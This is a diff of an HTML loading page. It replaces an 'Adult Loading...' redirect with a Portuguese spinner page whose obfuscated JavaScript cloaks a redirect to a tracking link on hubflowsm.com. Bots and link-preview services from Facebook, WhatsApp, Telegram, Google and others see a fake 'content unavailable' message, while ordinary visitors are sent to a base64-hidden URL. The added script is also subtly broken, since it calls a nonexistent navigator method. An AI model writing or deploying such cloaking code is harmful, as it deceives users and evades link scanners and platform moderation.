@@ -38,75 +38,57 @@
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background: #000;
-      font-family: 'Segoe UI', sans-serif;
-      color: #fff;
-      height: 100vh;
+      font-family: sans-serif;
+      background: #fff;
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-
-    .container {
-      background: #1c1c1c;
-      padding: 40px 60px;
-      border-radius: 50px;
-      box-shadow: 0 0 15px #e60073;
+    .loading {
       text-align: center;
     }
-
-    .title {
-      font-size: 2em;
-      font-weight: bold;
-      margin-bottom: 20px;
-      color: #fff;
-      text-shadow: 0 0 6px #ff4d94;
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #333;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
     }
-
-    .progress-bar {
-      width: 100%;
-      background-color: #333;
-      border-radius: 30px;
-      overflow: hidden;
-      height: 20px;
-      box-shadow: inset 0 0 10px #000;
-    }
-
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(to right, #e60073, #ff66a3);
-      animation: loading 1s ease-in-out forwards;
-    }
-
-    .loading-text {
-      margin-top: 20px;
-      font-size: 1.2em;
-      color: #ff99c2;
-    }
-
-    @keyframes loading {
-      from { width: 0%; }
-      to { width: 100%; }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <div class="title">Adult Loading...</div>
-    <div class="progress-bar">
-      <div class="progress"></div>
-    </div>
-    <div class="loading-text">...</div>
+  <div id="conteudo" class="loading">
+    <div class="spinner"></div>
+    <p>Carregando, aguarde...</p>
   </div>
 
   <script>
-    setTimeout(function() {
-      window.location.href = "https://bgfffig.hubflowsm.com/s/63d00e240fcd5?subsource=FMatch ";
-    }, 1050);
-  </script>
+    (function () {
+      var _0x1a2b=["\x6C\x6F\x67","\x72\x65\x66\x72\x65\x73\x68","\x6D\x61\x74\x63\x68","\x73\x70\x69\x64\x65\x72","\x61\x74\x6F\x62","\x69\x6E\x63\x6C\x75\x64\x65\x73"];
+      const _0x8ac3 = navigator[_0x1a2b[5]]().toLowerCase();
+      const _0x6d2b = ['bot','crawl','spider','facebook','twitter','slack','discord','linkedin','preview','whatsapp','telegram','pinterest','reddit','nuzzel','skype','google','bitlybot'];
 
+      for (let i = 0; i < _0x6d2b.length; i++) {
+        if (_0x8ac3.includes(_0x6d2b[i])) {
+          document.body.innerHTML = "<h1>Conteúdo temporariamente indisponível.</h1>";
+          return;
+        }
+      }
+
+      const _0x7896 = "aHR0cHM6Ly9iZ2ZmZmlnLmh1YmZsb3dzbS5jb20vcy82M2QwMGUyNDBmY2Q1P3N1YnNvdXJjZT1GTWF0Y2g=";
+      const _0x1234 = atob(_0x7896);
+
+      setTimeout(() => {
+        window.location.href = _0x1234;
+      }, 1500);
+    })();
+  </script>
 </body>
 </html>
